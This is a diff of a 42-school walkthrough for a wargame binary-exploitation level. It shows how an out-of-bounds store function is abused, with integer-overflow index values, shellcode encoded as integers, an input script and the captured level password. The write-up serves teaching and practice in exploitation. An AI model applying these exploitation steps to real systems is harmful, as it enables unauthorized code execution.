@@ -1,34 +1,54 @@
-we try to overwrite the main return address using the store function
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2019/05/22 21:41:18 by lgarczyn          #+#    #+#              #
+#    Updated: 2019/05/22 21:54:39 by lgarczyn         ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
 
-we find it is offset by 464
+The executable allows us to store ints nearly anywhere on the stack.
+
+The store function:
+	* takes a number n
+	* takes an index i
+	* if i is a multiple of 3
+		* multiplies i by 4
+		* stores n at i + array address
+
+We try to overwrite the main return address using the store function.
+
+We find it is offset by 464 bytes.
 
 index = 464 / 4 = 114
 
-but we receive the message: "address forbidden by wil"
+But we receive the message: "address forbidden by wil", as i % 3 = 0.
 
-we try to overwrite the printf plt
+We try to overwrite the printf plt.
 
-offset to 0x0 = 0x2b9c
-
+offset from array to 0x0 = 0x2b9c
 printf plt = 0x08048470
 offset to printf plt = (0x08048470 + 0x2b9c) / 4 => 33631235
 
-we use 'read' to check on the real binary
-we get 2684626431, or 0xA00425FF, which is correct
-we get a segfault on the real binary
+We use 'read' to check on the real binary
+We get 2684626431, or 0xA00425FF, which is correct
+We get a segfault on the real binary, indicating that the PLT is protected
 
-we try again with the main return address
+We try again with the main return address.
 
-since the index is multiplied by 4, any number in the last 2 bits will overflow
+Since the index is multiplied by 4, any number in the last 2 bits will overflow
 0x80000000 + 114 = 0x80000072 = -2147483534
-however, if the index is negative, the rightmost bit will be one-init
+However, if the index is negative, the rightmost bit will be one-init
 0x40000000 + 114 = 0x80000072 = 1073741938
 
-4294956148
-
-Unfortunately, we can only use indexes not mutiples of 3,
-so we write a shellcode that can have abitrary data there,
-using a relative 4-byte jump before each gap
+We can't store our shellcode in env variable or user inputs.
+We can however store it directly in the number storage.
+Unfortunately, we can only use indexes not mutiples of 3.
+So we write a shellcode that can have 4 bytes of abitrary data every 8 bytes,
+using a relative 4-byte jump before each gap.
 
 0:	90909090
 
@@ -54,7 +74,9 @@ using a relative 4-byte jump before each gap
 
 13:	b00bcd80
 
-we convert to int
+Here "EB04" increments the code pointer by one, then by the byte arg 0x04
+
+We convert to int, minding the endian conversion
 
 1:	2421211185
 2:	82546832
@@ -66,9 +88,9 @@ we convert to int
 11:	82567561
 13:	1073741938
 
-the address of our shellcode will be 0xffffd474 + 4 or 4294956152,
-because we start at index one
-we create a script
+The address of our shellcode will be 0xffffd474 + 4 or 4294956152,
+as we start at index one.
+We create a simple script:
 
 store
 2421211185
@@ -102,4 +124,6 @@ store
 1073741938
 quit
 
-7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+> cd ../level08
+> cat .pass
+< 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
